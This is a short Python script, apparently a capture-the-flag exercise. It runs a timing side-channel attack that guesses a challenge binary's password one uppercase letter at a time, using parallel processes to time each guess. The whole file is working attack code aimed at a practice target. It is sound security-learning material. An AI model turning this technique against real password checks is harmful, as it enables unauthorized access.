# This is just a really really basic timing attack where Im playing around with using multiprocessing parallelism rather than concurrency

# Command to get it to the hackcenter server
#     scp -i ~/.ssh/hack ./timing_attack.py jledon@shell-hackcenter.dbrumley.com:timing.py

import string, math
import time, resource
import argparse, re

import subprocess as sp
# from threading import Thread # threads are concurrent but not parallel, this is bad
from multiprocessing import Pool


parser = argparse.ArgumentParser(prog='Timing Attack')
parser.add_argument("-s", "--start-pw", type=str, required=False, default="")

args = parser.parse_args()
pw = args.start_pw

end_char = "_"

def TimedCommand(char):
    agg = list()
    for _ in range(3):
        usage_start = resource.getrusage(resource.RUSAGE_CHILDREN)
        time_start = time.time()

        # out = sp.run(f"./fake {pw}{char}{end_char}", shell=True, stdout=sp.DEVNULL, stderr=sp.STDOUT).stdout
        sp.run(f"/problems/febe26826d97b496639a3bca0d5e8a05/kronos {pw}{char}{end_char}", shell=True, stdout=sp.DEVNULL, stderr=sp.STDOUT).stdout
        # print(out)

        usage_end = resource.getrusage(resource.RUSAGE_CHILDREN)
        time_end = time.time()

        cpu_time = usage_end.ru_stime - usage_start.ru_stime # use system time, not ru_utime user mode
        duration = time_end - time_start
        agg.append(duration)
    avg = sum(agg) / len(agg)
    print(f"{char}: {avg}")
    return (f"{pw}{char}", avg)

def main():
    max_parallel = 7
    with Pool(max_parallel) as p:
        data = p.map(TimedCommand, string.ascii_uppercase)
    data.sort(key=lambda pair: pair[1], reverse=True)
    print(data)

if __name__ == "__main__":
    main()


